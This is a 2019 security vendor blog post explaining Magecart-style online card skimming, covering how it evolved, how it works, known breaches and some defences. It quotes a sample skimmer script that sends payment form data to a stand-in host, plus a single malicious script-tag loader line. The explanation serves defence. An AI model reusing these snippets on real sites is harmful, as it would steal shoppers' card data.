---
template: "blog/blog-post"
draft: false

# Metadata
title: "All About Online Skimming or Digital Skimming Attacks"
description: "Read everything you need to know about skimming attacks or magecart style attacks. The post explains the evolution of skimming attacks, how does it work, examples of skimming attacks, trends and how to protect against skimming in detail."

# Breadcrumbs
breadcrumbs:
  - name: TechBlog
    path: /techBlog/
  - name: All About Online Skimming...

# Fields
date: 2019-07-24
author:
  - Mickey Alton

blog_title: "All About Online Skimming or Digital Skimming Attacks"
categories: Research
tags:
  - client side data protection
  - online skimming attacks

thumbnail: digital-skimming.jpg
---

![All About Online Skimming or Digital Skimming Attacks](/assets/images/blog/digital-skimming.jpg)<br>

The rise of digital skimming attacks, web-based supply chain attacks, in recent years is stressing the e-commerce industry. E-commerce companies cannot ignore web-based supply chain attacks resulting in direct website breaches.

Our previous blog post, [Client-Side battle against JavaScript attacks](/blog/client-side-battle-against-javascript-attacks/), and [Why SRE’s should worry more about third-party javascript](/blog/sres-should-worry-third-party-javascript/), shed light on the growing digital skimming menace.

Digital skimming is a semi-new threat, often called “Magecart,” consists of more than a dozen “official” different rival groups. These groups are targeting online retailers and eluding security researchers. Interestingly enough these groups don't always play nice with each other. They compete with each other to steal “low hanging” credit card data and personally identifiable information (PII). And resell them on deep-web and dark-net markets. This client-side threat is the new face of modern e-commerce cybercrimes.

## What is Skimming

Skimming Definition: Skimming or card skimming was originally used to describe the physical tampering of POS (point-of-sale) devices, ATMs and gas pumps by placing a hidden device inside them to steal credit card information.
The stolen credit card information is used to make online (card-not-present) purchases, cloned for in-store (card present) purchases or sold on different deep-web markets and darknet markets.
Victims of credit card skimming were often unaware of the theft until they noticed unauthorized charges on their account.

## What is digital skimming or online card skimming

Digital skimming is a term describing the action of stealing credentials and sensitive payment information from website visitors. Digital skimmers use pre-placed malicious javascript code that sniffs user inputs from sensitive forms or creates a malicious iframe with fake payment forms to sniff credit card information.

![This is an example of a card skimmer](/assets/images/blog/card-skimmer.jpg)

## The evolution of skimming

Later on, cybercriminals started to practice the same concept of card skimming - online. Instead of placing a physical device on the ATM, they would place a code that acts the same way (scanning private information) in online stores. There are more than a few synonyms for this semi-new cybercrime trend of digital skimming: js sniffing, digital skimming, web-skimming, and js stealer. They all refer to the same practice of injecting an unwanted piece of javascript malware into website cart or checkout page code to ‘grab’ sensitive information.

## What does a digital or online card skimming code look like

Below is a skimming script example taken from [Github](https://github.com/mspringfield/MageCart_Testing/blob/master/include.js) that resembles pieces of code that were used to carry out real sniffing operations.

```javascript
window.onload = function() {
  jQuery("#ifrmPayment")
    .contents()
    .find("#btnCreditCard")
    .bind("mouseup touchend", function(e) {
      var dati = jQuery("#ifrmPayment")
        .contents()
        .find("form");
      setTimeout(function() {
        jQuery.ajax({
          type: "POST",
          async: true,
          url: "hxxp://example.net/evilform.php",
          data: pdati,
          dataType: "application/json",
        });
      }, 20);
    });
};
```

_Code taken from Github that was used to carry out real sniffing operations._

Skimming scripts usually come heavily obfuscated, some are very short and have less than 20 lines of ‘innocent’ JavaScript code and one line that contains the malicious behavior. In the example above, we can see that the attackers are leveraging legitimate jQuery.

## How does digital or online card skimming work

Most of the skimming operations are carried out in two ways:

- Direct hack of a website: The direct hack of a website or a batch of websites, by brute-forcing administrator credentials (called brute-force attacks) or by using known, zero-day vulnerabilities (usually CMS based) for placing a malicious js in a website is an obvious but still attractive way to carry out a skimming operation.
- Supply chain attack: The more contemporary way - infection by supply chain attack - can be read in our latest blog, client-side-The security-blindspot of your website. The client-side has been evaluated and now two of the main sources of JS modules are open-source libraries and third-party vendors. This attack works by “simply” compromising one third-party vendor and tampering with the original script to deliver the malicious piece of code with the original code to all of the websites using the poisoned third-party script.

## Examples Of Magecart Skimming Attacks

During the period of 2017-2018 more than 12 third-party vendors were breached by “Magecart” (group 5), a few among them are:

- [Feedify](https://www.zdnet.com/article/feedify-becomes-latest-victim-of-the-magecart-malware-campaign/), August - September 2018. Feedify, an Indian company that provides browser-based customer survey service, has more than 4,000 customers according to its website. After Feedify detected the breach and removed the malicious script, the attackers (who had control of the core infrastructure) kept adding the skimming script three more times before the root cause of the breach was truly fixed.
- PushAssist is a 3rd party vendor offering a push notification service to reach and re-engage customers, it was also compromised my Magecart to deliver malicious JS sniffing code to websites that use PushAssist’s service.
  These third-party vendor breaches and many more resulted in a huge impact on tens of thousands of visitors.

Moreover, while press releases and news tend to focus on operations against known brands and websites there are ongoing attacks carried out widely targeting CMS-based websites.
The impact of these attacks should not be taken lightly. For instance, less than a year ago around 17 vulnerable Magento extensions were leveraged by skimmers to launch wide skimming attacks using POI (PHP object Sterilization) [vulnerability in several popular Magento extensions](https://sansec.io/labs/2018/10/23/magecart-extension-0days/).
Over 7,000 Magento shops were reported as compromised during 2018 alone. In most cases, the infection was as simple as a single line of HTML that loads a malicious script used to carry out the attack methodically on thousands of website without much effort.

```javascript
<script type="text/javascript" src="https://magento.name/mage/mage.js"></script>
```

Although site owners have been notified by good samaritans security researchers that the C&C servers were a sinkhole, hundreds of website still have the malicious snippet embedded in their source code while the malware itself does not exist anymore. It remains from a past breach.
Magento Commerce, Powerfront CMS, and OpenCart-based website are under constant attack in a new era of digital skimming and there’s not a proper solution as of today. Magento shop breaches are losing their attention to more ‘appealing’ campaigns, involving compromises of larger brands such as Techrabbit, [VisionDirect](https://www.bleepingcomputer.com/news/security/visiondirect-data-breach-caused-by-magecart-attack/) and many more.

## Digital Skimming Trends

Digital skimming is on an upward trend. This new fraud trend does not seem to be fading out, with new breaches, new actors and hundreds of thousands of victims.
According to [Gemini Advisory’s](https://geminiadvisory.io/card-fraud-on-the-rise/) research, fraud involving physical cards (CP: card-present) is on a downward trend while online (CNP: card-not-present - skimmed digitally) is rising.

![Comparison of card-present vs. card-not-present fraud](/assets/images/blog/comparison-card-present-not-present.jpg)<br>

These trends correlate perfectly with similar findings by 2019 [Verizon](https://enterprise.verizon.com/resources/reports/2019-data-breach-investigations-report.pdf) data breach report that clearly shows the rise in new web skimming trend. In their words exactly, “Web application attacks have punched the time clock and relieved POS Intrusion of their duties.“

## How to protect against digital or online card skimming?

Even though the digital skimming threat is constantly evolving, attackers always stay busy finding new ways to infect websites and exfiltrate sensitive data. There are relatively simple countermeasures that can be taken in order to protect against the threat of online card skimming.

1. Correct use of Content Security Policy (CSP) by website administrators. CSP headers are used to restrict communication and data transfer between domains and will constitute a great blocker for a malicious script trying to transfer data from domain to unauthorized domain.
2. From the visitor's point of view (client-side): There are more than a few extensions such as “ScriptSafe”, “ContentBlockHelper”, “NoScript” and more that provide the users both control on actions made by scripts and visibility on all the domains that are serving scripts. Another option is using privacy-oriented browsers such as “Brave Browser” that allows the user to block the third-party script from being loaded.

Stay tuned for more blogs on the topic of third-party code vulnerabilities. Find out more about protecting against digital skimming attacks with [PerimeterX code defender](/products/code-defender/).
